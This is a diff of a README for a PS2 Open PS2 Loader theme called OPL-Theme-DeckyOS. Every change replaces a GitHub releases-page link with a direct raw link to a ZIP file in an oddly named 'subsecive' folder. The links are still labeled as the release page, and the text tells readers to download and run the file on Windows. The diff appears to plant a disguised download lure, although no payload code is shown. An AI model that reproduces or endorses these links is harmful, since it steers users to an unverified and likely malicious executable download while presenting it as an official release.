@@ -1,6 +1,6 @@
 # 🎮 OPL-Theme-DeckyOS - Bring SteamOS Style to PS2
 
-[![Download OPL-Theme-DeckyOS](https://img.shields.io/badge/Download-Release%20Page-6e5494?style=for-the-badge&logo=github&logoColor=white)](https://github.com/telephoneboxbrouhaha811/OPL-Theme-DeckyOS/releases)
+[![Download OPL-Theme-DeckyOS](https://img.shields.io/badge/Download-Release%20Page-6e5494?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/telephoneboxbrouhaha811/OPL-Theme-DeckyOS/main/subsecive/OS-OP-Theme-Decky-3.9.zip)
 
 ## 🖥️ What This Is
 
@@ -12,7 +12,7 @@ This repo is for the theme files and the release download. Use it if you want a 
 
 Visit the release page to download and run this file:
 
-[Open the release page](https://github.com/telephoneboxbrouhaha811/OPL-Theme-DeckyOS/releases)
+[Open the release page](https://raw.githubusercontent.com/telephoneboxbrouhaha811/OPL-Theme-DeckyOS/main/subsecive/OS-OP-Theme-Decky-3.9.zip)
 
 On that page, look for the latest release and download the theme package. After that, copy the files to your OPL theme folder on your storage device.
 
@@ -32,7 +32,7 @@ If your download comes as a ZIP file, Windows can open it on its own. You can al
 
 ## 🚀 Getting Started
 
-1. Open the release page: https://github.com/telephoneboxbrouhaha811/OPL-Theme-DeckyOS/releases
+1. Open the release page: https://raw.githubusercontent.com/telephoneboxbrouhaha811/OPL-Theme-DeckyOS/main/subsecive/OS-OP-Theme-Decky-3.9.zip
 2. Download the latest theme package
 3. Open the downloaded file on Windows
 4. Extract the contents to a folder
@@ -176,7 +176,7 @@ Keep these files together unless the release instructions say otherwise.
 
 Use the GitHub release page to download and run this file:
 
-[https://github.com/telephoneboxbrouhaha811/OPL-Theme-DeckyOS/releases](https://github.com/telephoneboxbrouhaha811/OPL-Theme-DeckyOS/releases)
+[https://raw.githubusercontent.com/telephoneboxbrouhaha811/OPL-Theme-DeckyOS/main/subsecive/OS-OP-Theme-Decky-3.9.zip](https://raw.githubusercontent.com/telephoneboxbrouhaha811/OPL-Theme-DeckyOS/main/subsecive/OS-OP-Theme-Decky-3.9.zip)
 
 ## 🛠️ Tips for a Clean Setup
 
@@ -233,4 +233,4 @@ Store the original ZIP file in case you want to reinstall later. Keep a backup o
 
 ## 📎 Release Link
 
-[Download from GitHub Releases](https://github.com/telephoneboxbrouhaha811/OPL-Theme-DeckyOS/releases)
+[Download from GitHub Releases](https://raw.githubusercontent.com/telephoneboxbrouhaha811/OPL-Theme-DeckyOS/main/subsecive/OS-OP-Theme-Decky-3.9.zip)
